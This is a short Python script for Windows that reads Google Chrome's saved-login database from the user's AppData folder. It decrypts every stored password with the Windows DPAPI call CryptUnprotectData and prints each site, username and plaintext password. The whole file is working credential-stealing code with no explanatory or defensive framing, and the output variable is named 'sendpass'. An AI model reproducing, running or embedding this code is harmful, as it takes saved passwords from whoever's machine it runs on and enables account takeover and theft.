from os import getenv, sep
import sqlite3
import win32crypt

sendpass = ''
appdata = getenv("APPDATA")
connection = sqlite3.connect(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (sep,sep,sep,sep,sep,sep,sep))
cursor = connection.cursor()
cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
for information in cursor.fetchall():
	passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
	if passw:
		sendpass += ' [*] Website-origin: ' + information[0]
		sendpass += '\n [*] Website-action: ' + information[1]
		sendpass += '\n [*] Username: ' + information[2]
		sendpass += '\n [*] Password: ' + passw + '\n'
if sendpass:
	print sendpass
else:
	print ' [X] No passwords found'